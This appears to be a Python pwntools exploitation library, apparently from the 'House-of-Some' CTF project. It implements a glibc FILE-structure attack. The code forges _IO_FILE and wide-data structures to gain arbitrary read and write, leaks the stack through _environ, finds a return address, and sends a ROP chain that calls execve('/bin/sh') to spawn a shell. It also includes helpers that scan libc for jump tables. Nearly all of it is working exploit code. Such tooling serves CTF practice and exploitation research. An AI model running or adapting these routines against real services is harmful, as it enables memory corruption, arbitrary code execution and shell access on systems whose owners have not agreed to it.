"""
By Csome, enllus1on
ref: https://github.com/CsomePro/House-of-Some
ref: https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more
"""

from pwn import *
import bisect
from typing import Callable
# context.arch = "amd64"

class HouseOfSome:

    def __init__(self, libc: ELF, controled_addr, zero_addr=0):
        self.libc = libc
        self.controled_addr =controled_addr
        self.READ_LENGTH_DEFAULT = 0x400
        self.LEAK_LENGTH = 0x500
        self.zero_addr = zero_addr
        if self.zero_addr == 0:
            self.zero_addr = self.libc.symbols['_environ'] - 0x10

        self.fake_wide_data_template = lambda : flat({
            0x18: 0,
            0x20: 1,
            0x30: 0,
            0xE0: self.libc.symbols['_IO_file_jumps'] - 0x48,
        }, filler=b"\x00")

        self.fake_file_read_template = lambda buf_start, buf_end, wide_data, chain, fileno: flat({
            0x00: 0, # _flags
            0x20: 0, # _IO_write_base
            0x28: 0, # _IO_write_ptr
            
            0x38: buf_start, # _IO_buf_base
            0x40: buf_end, # _IO_buf_end
            
            0x70: p32(fileno), # _fileno
            0x82: b"\x00", # _vtable_offset
            0x88: self.zero_addr,
            0xc0: 2, # _mode
            0xa0: wide_data, # _wide_data
            0x68: chain, # _chain
            0xd8: self.libc.symbols['_IO_wfile_jumps'], # vtable
        }, filler=b"\x00")

        self.fake_file_write_template = lambda buf_start, buf_end, chain, fileno: flat({
            0x00: 0x800 | 0x1000 | 0x8000, # _flags
            
            0x20: buf_start, # _IO_write_base
            0x28: buf_end, # _IO_write_ptr

            0x70: p32(fileno), # _fileno
            0x68: chain, # _chain
            # 0x88: self.zero_addr,
            0xd8: self.libc.symbols['_IO_file_jumps'], # vtable
        }, filler=b"\x00")

        # ref: https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more
        self.hoi_read_file_template = lambda read_addr, len, _chain, _fileno: fit({
            0x00: 0x8000 | 0x40 | 0x1000, #_flags
            0x20: read_addr, #_IO_write_base
            0x28: read_addr + len, #_IO_write_ptr
            0x68: _chain, #_chain
            0x70: p32(_fileno), # _fileno
            0xc0: 0, #_modes
            0xd8: self.libc.sym["_IO_file_jumps"] - 0x8, #_vtable
        }, filler=b'\x00')

        self.wide_data_length = len(self.fake_wide_data_template())
        self.read_file_length = len(self.fake_file_read_template(0, 0, 0, 0, 0))
        self.write_file_length = len(self.fake_file_write_template(0, 0, 0, 0))
        self.hoi_read_file_length = len(self.hoi_read_file_template(0, 0, 0, 0))

        self.panel = max(self.hoi_read_file_length * 2, self.write_file_length + self.hoi_read_file_length)
        self.switch = 0
        self.addr_panel = [self.controled_addr, self.controled_addr+self.panel]

        self.functions = [
            (f.address, f) for f in self.libc.functions.values()
        ]
        self.functions.sort(key=lambda x: x[0])
        self.text_section_start = self.libc.get_section_by_name(".text").header.sh_addr + self.libc.address
        self.text_section_end = self.libc.get_section_by_name(".text").header.sh_size + self.text_section_start

    def _next_control_addr(self, addr, len):
        # return addr + len
        """
        内存复用，仅仅使用self.panel * 2内存即可，防止多次RE后溢出
        """
        if len <= self.panel:
            self.switch = 1 - self.switch
            return self.addr_panel[self.switch]
        return self.addr_panel[0] + self.panel * 2
    
    def read(self, fd, buf, len, end=0):
        addr = self.controled_addr
        f_read_file_0 = self.hoi_read_file_template(buf, len, addr+self.hoi_read_file_length, fd) 
        # f_wide_data = self.fake_wide_data_template()
        addr += self.hoi_read_file_length
        self.controled_addr = self._next_control_addr(self.controled_addr, self.hoi_read_file_length * 2)
        f_read_file_1 = self.hoi_read_file_template(self.controled_addr, 
                                                     self.READ_LENGTH_DEFAULT, 
                                                     0 if end else self.controled_addr, 
                                                     0) 
        
        payload = flat([
            f_read_file_0,
            f_read_file_1,
        ])
        assert b"\n" not in payload, "\\n in payload."
        return payload
    
    def write(self, fd, buf, len):
        addr = self.controled_addr
        f_write_file = self.fake_file_write_template(buf, buf+len, addr+self.write_file_length, fd) 
        addr += self.write_file_length
        self.controled_addr = self._next_control_addr(self.controled_addr, self.hoi_read_file_length + self.write_file_length)
        f_read_file_1 = self.hoi_read_file_template(self.controled_addr, self.READ_LENGTH_DEFAULT, self.controled_addr, 0) 
        
        payload = flat([
            f_write_file,
            f_read_file_1,
        ])
        
        assert b"\n" not in payload, "\\n in payload."
        return payload
    
    def bomb(self, io: tube, retn_addr=0):

        stack = self.bomb_raw(io, retn_addr)

        rop = ROP(self.libc)
        rop.base = stack
        rop.call('execve', [b'/bin/sh', 0, 0])
        log.info(rop.dump())
        rop_chain = rop.chain()
        assert b"\n" not in rop_chain, "\\n in rop_chain"
        io.sendline(rop_chain)

    def bomb_raw(self, io: tube, retn_addr=0):
        payload = self.write(1, self.libc.symbols['_environ'], 0x8)
        io.sendline(payload)
        stack_leak = u64(io.recv(8).ljust(8, b"\x00"))
        log.success(f"stack_leak : {stack_leak:#x}")

        payload = self.write(1, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)
        io.sendline(payload)
        # retn_addr = self.libc.symbols['_IO_file_underflow'] + 390
        buf = io.recv(self.LEAK_LENGTH)
        flush_retn_addr = self.stack_view(buf)
        if retn_addr == 0 and flush_retn_addr != 0:
            retn_addr = flush_retn_addr
            success("retn_addr(_IO_flush_all) find")
            success(f"fix retn_addr to {flush_retn_addr:#x}")
        log.success(f"retn_addr : {retn_addr:#x}")
        offset = buf.find(p64(retn_addr))
        log.success(f"offset : {offset:#x}")

        assert offset > 0, f"offset not find"

        payload = self.read(0, stack_leak - self.LEAK_LENGTH + offset, 0x300, end=1)
        io.sendline(payload)

        return stack_leak - self.LEAK_LENGTH + offset
    
    def stack_view(self, stack_leak_bytes: bytes):
        # TODO this function now only support amd64 
        got_ret_addr = 0
        next_flush = False
        for i in range(0, len(stack_leak_bytes), 8):
            value = u64(stack_leak_bytes[i:i+8])
            if value < self.libc.address:
                continue
            idx = bisect.bisect_left(self.functions, value, key=lambda x: x[0])
            if idx >= len(self.functions) or self.functions[idx][1].address != value:
                idx -= 1
            if idx < 0 or value - self.functions[idx][1].address >= self.functions[idx][1].size:
                # TODO show rwx more info
                # rwx = ""
                # rwx += "r" if segment.header.p_flags & 4 else "-"
                # rwx += "w" if segment.header.p_flags & 2 else "-"
                # rwx += "x" if segment.header.p_flags & 1 else "-"
                if self.text_section_start <= value <= self.text_section_end: 
                    print(f"[{i:#x}] {value:#x} => libc.address+{value - self.libc.address:#x}")
                    if next_flush == True and got_ret_addr == 0:
                        got_ret_addr = value
                continue

            function = self.functions[idx][1]
            if value - function.address > function.size:
                continue
            print(f"[{i:#x}] {value:#x} => {function.name}+{value - function.address}")
            if "_IO_flush_all" in function.name:
                got_ret_addr = value
            if got_ret_addr == 0 and "_IO_do_write" in function.name:
                next_flush = True

        return got_ret_addr
            
            
        


class IO_jumps_t:
    
    def __init__(self, addr) -> None:
        self.address = addr
        self.dummy        = 0
        self.dummy2       = 0
        self.finish       = 0
        self.overflow     = 0
        self.underflow    = 0
        self.uflow        = 0
        self.pbackfail    = 0
        self.xsputn       = 0
        self.xsgetn       = 0
        self.seekoff      = 0
        self.seekpos      = 0
        self.setbuf       = 0
        self.sync         = 0
        self.doallocate   = 0
        self.read         = 0
        self.write        = 0
        self.seek         = 0
        self.close        = 0
        self.stat         = 0
        self.showmanyc    = 0
        self.imbue        = 0
    
    @classmethod
    def from_bytes(cls, addr: int, data: bytes):
        datalist = []
        for i in range(0, len(data), 8):
            datalist.append(u64(data[i:i+8]))
        res = cls(addr)
        res.dummy        = datalist[0]
        res.dummy2       = datalist[1]
        res.finish       = datalist[2]
        res.overflow     = datalist[3]
        res.underflow    = datalist[4]
        res.uflow        = datalist[5]
        res.pbackfail    = datalist[6]
        res.xsputn       = datalist[7]
        res.xsgetn       = datalist[8]
        res.seekoff      = datalist[9]
        res.seekpos      = datalist[10]
        res.setbuf       = datalist[11]
        res.sync         = datalist[12]
        res.doallocate   = datalist[13]
        res.read         = datalist[14]
        res.write        = datalist[15]
        res.seek         = datalist[16]
        res.close        = datalist[17]
        res.stat         = datalist[18]
        res.showmanyc    = datalist[19]
        res.imbue        = datalist[20]
        return res
    
    def print(self):
        s = ""
        s += "type struct _IO_jumps_t [0x%x] = \n" % self.address       
        s += "\t[0]  dummy        = 0x%x\n" % self.dummy       
        s += "\t[1]  dummy2       = 0x%x\n" % self.dummy2      
        s += "\t[2]  finish       = 0x%x\n" % self.finish      
        s += "\t[3]  overflow     = 0x%x\n" % self.overflow    
        s += "\t[4]  underflow    = 0x%x\n" % self.underflow   
        s += "\t[5]  uflow        = 0x%x\n" % self.uflow       
        s += "\t[6]  pbackfail    = 0x%x\n" % self.pbackfail   
        s += "\t[7]  xsputn       = 0x%x\n" % self.xsputn      
        s += "\t[8]  xsgetn       = 0x%x\n" % self.xsgetn      
        s += "\t[9]  seekoff      = 0x%x\n" % self.seekoff     
        s += "\t[10] seekpos      = 0x%x\n" % self.seekpos     
        s += "\t[11] setbuf       = 0x%x\n" % self.setbuf      
        s += "\t[12] sync         = 0x%x\n" % self.sync        
        s += "\t[13] doallocate   = 0x%x\n" % self.doallocate  
        s += "\t[14] read         = 0x%x\n" % self.read        
        s += "\t[15] write        = 0x%x\n" % self.write       
        s += "\t[16] seek         = 0x%x\n" % self.seek        
        s += "\t[17] close        = 0x%x\n" % self.close       
        s += "\t[18] stat         = 0x%x\n" % self.stat        
        s += "\t[19] showmanyc    = 0x%x\n" % self.showmanyc   
        s += "\t[20] imbue        = 0x%x\n" % self.imbue       
        print(s.strip())


class HouseLibc:
    
    def __init__(self, libc: ELF | str, verbose=False) -> None:
        self.raw_libc: ELF = None
        if isinstance(libc, ELF):
            self.raw_libc = libc
            libc = libc.file.name
        self.libc = ELF(libc, checksec=False)
        if not self.raw_libc:
            self.raw_libc = self.libc
        del libc
        self.jumps_range = self.find_jumps_range(self.libc)

        self.RANGE = (-40, 20)
        self.verbose = verbose

        self.maybe_file = []

        for i in range(*self.RANGE):
            dd = self.libc.read(self.libc.symbols['_IO_file_jumps'] + self.jumps_range * i, self.jumps_range)
            if self.check_jumps(dd):
                self.maybe_file.append(IO_jumps_t.from_bytes(self.libc.symbols['_IO_file_jumps'] + self.jumps_range * i, dd))

    @staticmethod
    def find_jumps_range(libc: ELF):
        """
        find IO_jumps_t real length 
        """
        data = libc.read(libc.symbols['_IO_file_jumps'], 0x200)
        datalist = []
        for i in range(0, len(data), 8):
            datalist.append(u64(data[i:i+8]))
            # print(f"{i:#x} => {u64(data[i:i+8]):#x}")
        gauss_range = 2
        while gauss_range:
            
            for i in range(gauss_range):
                if bool(datalist[i]) != bool(datalist[i + gauss_range]):
                    break
            else:
                break
            gauss_range += 1
        return gauss_range * 8
    

    @staticmethod
    def check_jumps(data: bytes):
        """
        check if data is IO_jumps_t type like or not.
        """
        datalist = []
        for i in range(0, len(data), 8):
            datalist.append(u64(data[i:i+8]))
        return datalist[0] == 0 and datalist[1] == 0
    
    def find_file_with_cond(self, cond: Callable[[IO_jumps_t, ELF], bool]) -> list[IO_jumps_t]:
        res = []
        for i, fp in enumerate(self.maybe_file):
            if cond(fp, self.libc):
                res.append(fp)
                if self.verbose:  # debug
                    print(f"index: {i}")
                    fp.print()
        return res
    
    def find__IO_wfile_jumps_maybe_mmap(self) -> IO_jumps_t:
        NAME = "_IO_wfile_jumps_maybe_mmap"
        def cond(fp: IO_jumps_t, libc: ELF) -> bool:
            return fp.overflow == libc.symbols['_IO_wfile_overflow'] \
                and fp.close == libc.symbols['_IO_file_close'] \
                and fp.underflow != libc.symbols['_IO_wfile_underflow']

        res = self.find_file_with_cond(cond)

        if len(res) > 1:
            log.warn(f"Foound dup {NAME} in [{', '.join(map(lambda x: f'{x.address:#x}', res))}], default using 0 index.")
        if len(res) == 0:
            raise LookupError(f"Could not find the {NAME}")
        if len(res) == 1:
            log.success(f"Found {NAME} in {res[0].address+self.raw_libc.address:#x}")
        return res[0]